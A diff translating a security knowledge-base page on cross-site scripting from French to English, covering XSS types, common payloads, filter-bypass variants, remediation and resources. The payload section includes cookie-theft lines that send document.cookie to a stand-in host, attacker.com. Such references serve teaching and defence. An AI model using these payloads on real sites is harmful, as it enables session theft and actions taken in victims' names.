@@ -10,26 +10,26 @@ last_updated: 2024-01-01
 
 ## 📖 Description
 
-> Injection de scripts malveillants dans des pages web vues par d'autres utilisateurs. Permet de voler des cookies, rediriger des utilisateurs ou effectuer des actions en leur nom.
+> Injection of malicious scripts into web pages viewed by other users. Allows stealing cookies, redirecting users, or performing actions on their behalf.
 
-**OWASP :** A03:2021 — Injection  
-**CVSS Score moyen :** 6.1 (Medium)
+**OWASP:** A03:2021 — Injection  
+**Average CVSS Score:** 6.1 (Medium)
 
 ---
 
-## 🔬 Types de XSS
+## 🔬 Types of XSS
 
-| Type | Description | Persistance |
+| Type | Description | Persistence |
 |------|-------------|-------------|
-| **Reflected** | Payload dans l'URL, reflété dans la réponse | Non persistant |
-| **Stored** | Payload stocké en BDD, affiché à chaque visite | Persistant ⚠️ |
-| **DOM-Based** | Manipulation du DOM côté client | Variable |
+| **Reflected** | Payload in URL, reflected in the response | Non-persistent |
+| **Stored** | Payload stored in DB, displayed on every visit | Persistent ⚠️ |
+| **DOM-Based** | Client-side DOM manipulation | Variable |
 
 ---
 
-## 💥 Payloads courants
+## 💥 Common Payloads
 
-### Test basique
+### Basic test
 
 ```html
 <script>alert('XSS')</script>
@@ -38,14 +38,14 @@ last_updated: 2024-01-01
 javascript:alert('XSS')
 ```
 
-### Vol de cookie (impact réel)
+### Cookie theft (real impact)
 
 ```html
 <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
 <img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
 ```
 
-### Bypass de filtres
+### Filter bypass
 
 ```html
 <ScRiPt>alert('XSS')</ScRiPt>
@@ -55,16 +55,16 @@ javascript:alert('XSS')
 
 ---
 
-## 🛡️ Remédiation
+## 🛡️ Remediation
 
-- **Échappement des sorties** — encoder `<`, `>`, `"`, `'`, `&`
-- **Content Security Policy (CSP)** — header HTTP limitant les scripts
-- **HttpOnly cookies** — inaccessibles via JavaScript
-- **Validation des entrées** — côté serveur uniquement
+- **Output escaping** — encode `<`, `>`, `"`, `'`, `&`
+- **Content Security Policy (CSP)** — HTTP header restricting scripts
+- **HttpOnly cookies** — not accessible via JavaScript
+- **Input validation** — server-side only
 
 ---
 
-## 🔗 Ressources
+## 🔗 Resources
 
 - [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
 - [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
